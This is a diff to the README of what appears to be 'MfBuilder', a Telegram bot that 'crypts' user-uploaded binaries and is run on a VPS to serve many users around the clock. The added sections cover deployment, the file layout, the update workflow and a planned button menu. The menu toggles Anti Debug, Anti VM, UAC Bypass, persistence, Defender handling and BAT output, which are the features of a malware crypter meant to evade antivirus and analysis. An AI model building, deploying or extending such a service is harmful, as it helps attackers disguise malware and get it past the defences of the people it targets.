@@ -35,11 +35,31 @@ The Telegram bot interface provides an interactive method for crypting binaries 
 
 ### System Requirements
 
-- Linux server or workstation (recommended) or Windows/macOS
-- Rust toolchain (1.70.0+)
-- OpenSSL development libraries
-- Network connectivity
-- Telegram account
+**Recommended**: Deploy on a VPS for 24/7 operation
+
+- **VPS** (Virtual Private Server) - For continuous availability
+  - Linux (Ubuntu/Debian recommended)
+  - 2GB RAM minimum, 4GB recommended
+  - 20GB disk space
+  - Dedicated IP address
+  - Examples: DigitalOcean, Vultr, Linode, Hetzner
+  
+- **Or** Local server/workstation (for testing)
+  - Linux, Windows, or macOS
+  - Same resource requirements
+  
+- **Software**:
+  - Rust toolchain (1.70.0+)
+  - OpenSSL development libraries
+  - Network connectivity
+  - Telegram account
+
+**Why VPS?**
+- ? Bot runs 24/7 without your PC
+- ? Remote access from anywhere
+- ? Professional uptime and reliability
+- ? Serve multiple users simultaneously
+- ? Easy updates and maintenance
 
 ### Software Dependencies
 
@@ -570,6 +590,82 @@ Regular checks:
 - Error logs
 - Authentication attempts
 - Build success rate
+
+---
+
+## Technical Details
+
+For in-depth technical information about how the bot works:
+
+- **Architecture**: See [BOT_TECHNICAL.md](BOT_TECHNICAL.md)
+- **VPS Deployment**: Detailed VPS setup and management
+- **File Access Model**: How bot accesses and manages files
+- **Session Management**: In-memory session storage
+- **Update Process**: Deploying updates without downtime
+- **Performance**: Resource usage and optimization
+
+### Quick Technical Overview
+
+**How It Works**:
+1. Bot runs as process on VPS/server
+2. Connects to Telegram API via HTTPS
+3. Stores sessions in memory (HashMap)
+4. Accesses MfRunner.exe and MfObfDotNet.exe from filesystem
+5. Creates temporary files for uploads/builds
+6. Sends crypted binary back to user
+
+**File Structure on VPS**:
+```
+/home/user/MfBuilder/
+??? MfBuilder (bot executable)
+??? MfRunner.exe
+??? MfObfDotNet.exe
+??? .env (bot token)
+??? [temp files - auto-cleaned]
+```
+
+**Update Process**:
+```bash
+# Simple update workflow
+git pull origin main
+cargo build --release
+sudo systemctl restart mfbuilder-bot
+# Bot updated, users can continue
+```
+
+---
+
+## Future Enhancements
+
+### Interactive Buttons (Planned)
+
+The current implementation uses text-based commands. A more interactive version could include:
+
+**Current**:
+```
+Send '1' to toggle Anti Debug
+Send '2' to toggle Anti VM
+...
+Send 'build' to build
+```
+
+**Enhanced with Buttons**:
+```
+[Anti Debug: OFF]  [Anti VM: OFF]  [CIS: OFF]
+[UAC Bypass: OFF]  [Single: OFF]   [Persist: OFF]
+[Defender: OFF]    [Format: BAT]
+          [?? BUILD]
+```
+
+**Implementation**: Using teloxide's `InlineKeyboardButton` feature.
+
+This would provide:
+- ? More intuitive interface
+- ? Visual feedback (buttons change on click)
+- ? Cleaner chat history
+- ? Mobile-friendly operation
+
+See teloxide documentation for inline keyboard implementation.
 
 ---
 
